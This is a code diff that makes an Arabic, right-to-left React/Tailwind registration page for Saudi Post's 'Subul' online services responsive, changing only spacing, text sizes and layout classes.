@@ -13,7 +13,7 @@ export default function Register() {
   };
 
   return (
-    <div className="min-h-screen bg-gray-100" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
+    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
       {/* Header - dark green bar with English on left */}
       <header className="bg-[#143c3c] py-2">
         <div className="container mx-auto px-4">
@@ -21,45 +21,45 @@ export default function Register() {
             {/* Empty space on right */}
             <div></div>
             {/* English on left */}
-            <a href="#" className="text-white text-sm hover:text-gray-300">English</a>
+            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
           </div>
         </div>
       </header>
 
       {/* Line below header */}
-      <div className="h-2 bg-[#146c84]"></div>
+      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>
 
       {/* Logo below header on right - aligned with form box */}
-      <div className="bg-gray-100 py-4">
+      <div className="bg-gray-100 py-3 md:py-4">
         <div className="container mx-auto px-4">
           <div className="max-w-xl mx-auto flex justify-start">
             <Link to="/">
-              <img src="/images/spl-logo.png" alt="سبل" className="h-14 md:h-16 w-auto" />
+              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
             </Link>
           </div>
         </div>
       </div>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-8 md:py-12">
+      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8 lg:py-12">
         <div className="max-w-xl mx-auto">
           {/* White Box Container */}
-          <div className="bg-white rounded-lg shadow-lg p-6 md:p-10">
+          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
             {/* Title */}
-            <h1 className="text-2xl md:text-3xl font-bold text-[#143c3c] text-right mb-4 md:mb-6">
+            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-right mb-3 md:mb-4 lg:mb-6">
               إنشاء حساب في الخدمات الإلكترونية
             </h1>
 
             {/* Subtitle */}
-            <h2 className="text-lg md:text-xl text-gray-600 text-right mb-6 md:mb-8">
+            <h2 className="text-base md:text-lg lg:text-xl text-gray-600 text-right mb-4 md:mb-6 lg:mb-8">
               قم بإنشاء حساب على سُبل اون لاين
             </h2>
 
             {/* Account Type Selection */}
             <form onSubmit={handleSubmit}>
-              <div className="space-y-3 md:space-y-4 mb-6">
+              <div className="space-y-2 md:space-y-3 lg:space-y-4 mb-4 md:mb-6">
                 {/* الأفراد */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -79,7 +79,7 @@ export default function Register() {
                 </label>
 
                 {/* الأعمال */}
-                <label className="flex items-center gap-2 cursor-pointer">
+                <label className="flex items-center gap-2 cursor-pointer py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -99,7 +99,7 @@ export default function Register() {
                 </label>
 
                 {/* الخدمات الحكومية - معطل */}
-                <label className="flex items-center gap-2 cursor-not-allowed opacity-50">
+                <label className="flex items-center gap-2 cursor-not-allowed opacity-50 py-1">
                   <div className="relative">
                     <input
                       type="radio"
@@ -116,7 +116,7 @@ export default function Register() {
               </div>
 
               {/* Government Notice */}
-              <p className="text-[#146c84] text-sm md:text-base text-right mb-8">
+              <p className="text-[#146c84] text-xs md:text-sm lg:text-base text-right mb-6 md:mb-8">
                 إذا كنت ترغب في إنشاء حساب حكومي، يرجى الاتصال بقسم المبيعات الحكومية
               </p>
 
@@ -124,7 +124,7 @@ export default function Register() {
               <div>
                 <button
                   type="submit"
-                  className="px-12 md:px-16 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
+                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                 >
                   متابعة
                 </button>
@@ -135,17 +135,17 @@ export default function Register() {
       </main>
 
       {/* Footer */}
-      <footer className="bg-[#143c3c] py-5">
-        <div className="container mx-auto px-4">
-          <div className="flex flex-col md:flex-row items-center justify-between text-white text-sm">
+      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
+        <div className="container mx-auto px-3 md:px-4">
+          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
             {/* Right side - Copyright */}
-            <div className="flex items-center gap-1 mb-2 md:mb-0">
+            <div className="flex items-center gap-1 text-center md:text-right">
               <span>©</span>
               <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
             </div>
             
             {/* Left side - Terms and Privacy */}
-            <div className="flex items-center gap-1">
+            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
               <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
               <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
               <span className="text-gray-300">و</span>
